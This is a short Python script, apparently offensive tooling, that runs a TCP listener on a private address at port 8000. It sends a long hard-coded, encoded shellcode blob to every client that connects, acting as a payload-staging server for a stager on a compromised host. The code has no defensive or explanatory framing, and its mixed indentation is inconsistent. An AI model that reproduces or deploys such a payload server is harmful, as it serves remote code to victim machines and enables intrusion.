#-*- coding=utf-8 -*-
import socket
import threading
import time  
#Written by Hacden 2020/03/22
def main():
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.bind(('172.16.0.3', 8000))
		s.listen(20)
		timeout = 10
		socket.setdefaulttimeout(timeout)
	
		while True:
			sock, addr = s.accept()
			t = threading.Thread(target=tcplink, args=(sock, addr))
			t.start()
	except EOFError as e:
		pass

def tcplink(sock, addr):
    print('Start download shellcode %s:%s...' % addr)
    shellcode = b'\xd9\xc6\xb8\x5f\x92\x95\x7f\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1\xfd\x83\xc3\x04\x31\x43\x13\x03\x1c\x81\x77\x8a\x7b\x6a\xae\x01\x5f\x81\xe9\x07\xcd\x53\xae\x87\xd8\x6a\x1f\xc1\x2b\x2a\x78\x2d\x0c\xac\xfb\xf6\x7b\x7c\x34\xe2\xbf\x19\xa0\x60\xc2\xba\x64\x80\x19\xac\xb6\x55\x8d\x34\xe7\x43\xd1\xa5\x4b\xac\x9d\x4b\xf2\x90\xfe\x71\x78\x81\xbe\xad\x8a\xdb\xd0\x4d\x72\x5a\x66\x58\x40\x67\x91\x5f\xa9\x2c\x3a\x99\xce\x60\xaa\x34\x52\xb2\x80\x3d\x9d\xe2\xbb\xbb\x0a\x23\x45\x2e\x0a\x70\x29\x3f\xec\x68\x44\x9b\x9c\xcb\xfe\x66\x0d\x04\x72\x52\x1b\xe1\xf6\x29\xb1\x89\x87\x84\x5b\xb7\x09\x4b\xa7\xef\x58\x12\xf7\x2d\xff\x90\x35\x68\x39\x6d\xa4\x5b\x4c\xfe\x83\x3d\xf0\x0a\x9c\x20\xae\x20\xa8\x9e\x4d\x19\x1a\x30\x76\x2c\xae\x2b\x61\x0b\x1e\xc6\xb0\x29\x48\x4a\x90\xca\xbf\x6f\x19\x67\xf5\x55\xee\xa5\x37\x8b\xc6\x8b\x20\xa8\x47\x2c\x9d\x76\x95\xb4\x64\xbc\xec\x90\xaa\x3e\x6d\xdb\x96\x9f\x96\x7d\x1a\xbf\xda\x6a\x1d\xdc\xd9\x98\x03\x1a\x21\xa7\xe2\x54\x9a\x79\x8c\x72\x19\x59\x0c\xb3\x13\x3b\xeb\x63\x6a\x0a\x4d\xc2\xc2\xc5\xed\xcf\x57\x94\x84\x9d\x47\x30\x1e\xed\x98\x4f\x53\xd7\xaa\x9e\xe6\x8f\xc4\x42\x38\x65\xe1\x41\x0d\xda\xdd\x46\xec\x4b\x05\x32\x0f\x3a\x99\x07\xf0\x91\xf4\x1e\x08\xd6\xd6\xff\x5f\x4b\xc5\x61\x0c\xf7\xb7\x84\xda\xe8\x9b\x58\x8b\xd8\x06\x80\x2c\x51\x6d\x62\xe0\x5d\x3f\x3b\x94\x51\x8e\x85\xba\xfd\x8c\x0f\xbb\x8c\xfc\x4c\x29\x5f\xc8\xef\xe6\x4a\xa3\x15\x29\x74\x8d\x2f\x13\x83\xbf\x3e\xa4\x53\x66\x03\x65\x1f\xc8\x35\xd4\x1c\x67\x44\xb3\x95\x93\x0f\x14\x5c\x8f\xad\xa3\x98\x1e\x24\xc6\xf9\x5e\x29\x11\xda\xda\x9c\xc3\xd1\x93\x37\xac\xdd\xa1\x9d\xb7\x8e\x57\x06\xf7\x0c\x98\xd0\x16\x05\x51\xda\xdd\xeb\xb2\x45\x6a\xae\x40\x38\x83\xc5\xc8\x02\x63\xcb\x0b\xf6\x0c\x7e\xc9\xeb\xf3\xd8\xbd\xd2\x21\xe5\xdd\xb5\x97\x2c\x51\xd2\x86\x9b\x09\x6f\x6f\x10\x93\x34\xcb\x8a\x75\x65\x1f\xb0\x56\x96\xee\x69\xe0\x2d\x82\xd1\x6d\xec\x96\x11\xfd\x6a\xb6\x0e\xd3\xa4\x87\x3b\x4c\xbe\xa0\x39\xd7\xf0\x95\xc4\xe6\x4d\xa8\xfd\xb7\xfc\x1c\x17\x70\xd3\x70\xf5\x06\xa8\x50\xd8\xd7\x14\xce\xeb\xc0\x8a\x86\x41\x34\x25\x43\x89\x5c\x96\xbe\xd9\x90\x7b\x00\xc6\x56\x34\x77\xa2\xed\xd3\x34\x7b\x0f\x37\xc6\xf5\xfe\x8f\x83\xc4\x56\x45\x3c\x7d\x50\x85\xea\x3c\x0e\xf1\x6e\xc9\xb2\x41\x29\x5b\x4c\x64\xce\x51\x17\xde\x81\x5c\x71\xe5\xc2\xd2\xea\xf0\x71\x0c\x49\x45\x9c\x4d\x49\xe8\x53\x5f\xd8\x41\x4c\xe8\xe5\xbb\x37\xc7\x36\xce\xd6\x24\x44\x6b\xd7\x9e\xa6\xdd\x5d\x27\xf5\x19\x08\x93\xa5\x26\xb0\x8d\xfc\x89\x29\xe5\xea\xc6\x71\x78\x71\x23\xe5\xd2\x3b\x69\x96\x62\x0c\xf6\x05\xb9\x8a\x37\x14\xe8\xf8\xff\x9b\x6b\x09\x63\x10\xd1\xe5\xae\x4d\xf9\xcc\x9d\xd0\xe0\xdb\x70\x9d\x68\xa7\x3e\x9d\xbd\xe1\x43\x66\x10\xf0\x75\xb1\x61\x9e\x5c\x4f\x41\x64\x53\x15\x73\x34\x56\x84\x31\x8c\xce\xa1\x06\x7c\x50\x01\x16\x69\x00\x73\x37\xa4\x73\x34\x9e\x42\x2f\xbc\x2c\x7d\x0c\x6c\x08\x54\xd6\x93\xe5\xde\xa5\xbd\xea\xdc\xa9\x29\x79\xc8\x4d\xef\xa6\x4b\xcf\x58\x27\x4a\x39\xdb\x9f\xfc\xeb\xde\xe1\x72\x15\xa5\xeb\x1b\x28\xba\xf8\xb4\x9f\x2e\xfb\x6c\x9b\x76\x73\x73\xde\xb0\xb9\xdb\x11\x7f\x52\x6b\xcf\x1b\x2f\xfb\x19\x9b\x38\xf2\xc6\xa8\xb6\x62\x5a\x79\xfe\xe2\x24\xf9\x94\xf8\xfd\xd6\xbd\x80\x66\x68\xe2\x17\xf0\xe8\xe9\xc9\x68\xf2\xaa\x5d\xb3\xb8\x61\x88\x20\x7d\xa4\x44\x3c\x43\xe4\x48\xe4\xc6\x92\x1b\xf1\xd9\xb5\x72\x94\xcd\x0c\x8c\x53\x6e\xd8\x4d\x08\x18\x94\x96\x03\x31\x87\xc0\x07\xa8\x05\xc2\xb4\x42\xa8\x0e\xb2\xce\x40\xd6\xee\x43\xc8\x6c\x26\xb5\x24\xeb\xb9\xc9\x41\xeb\xbe\xb2\x04\xf9\x68\xb0\x7a\x9c\xe2\xc6\x6c\xa1\xd9\x40\x99\x44\xa7\xcb\x92\xb3\x7b\x52\x1c\xd8\x87\x9b\x2f\x72\x0c\x16\xb2\x3d\xf2\x90\x0e\x8e\x6e\xdb\x57\x1c\xc1\x01\xe8\xc9\xf2\x2f\xfd\x12\x48\x8c\x04\xf6\x76\x7c\x2c\xd5\x8b\xf2\x49\xd9\x5f\x9a\x7c\x01\xea\xb8\xe6\x8e\xa4\x06\xb0\xc2\xc6\x02\xf5\x09\x8e\x99\x21\x83\x17\xc0\x72\x08\xe7\x84\x58\x38\x5e\x44\x61\x9d\xe2\xdd\x3f\x66\x40\x8e\x17\x9e\x3f\x1b\x78\xac\x26\xa2\x87\x0e\xe9\x8c\xb4\x1b\x1c\x75\x2c\x14\x84\x17\x14\xc0\x2e\x64\x95\x3f\x9b\x40\x63\x10\x80\x8e\x56\x7c\x37\x4b\x2e\x5c\xe3\xc3\xee\x35\xd6\x62\x3b\x44\xa4\x4c\x07\x46\xcd\xbd\x0c\xea\x19\xc3\x54\x13\x8b\xa5\x4e\x5b\xfc\xf4\xea\xfd\x4f\x36\x80\x5c\x34\xcd\xef\x8d\x3a\x16\x36\xc9\x05\x7c\xa1\x26\xce\x3b\xa1\x85\x11\x23\x98\x05\x66\x25\x51\x25\x01\x32\x41\xec\x66\xea\x32'
	
	print("shellcode lenth is %d"%len(shellcode))
    while True:
        print(sock.recv(1024))
        time.sleep(3)
        sock.send(shellcode)
        sock.close()
    print('Finish %s:%s ' % addr)

if __name__ == '__main__':
    main()
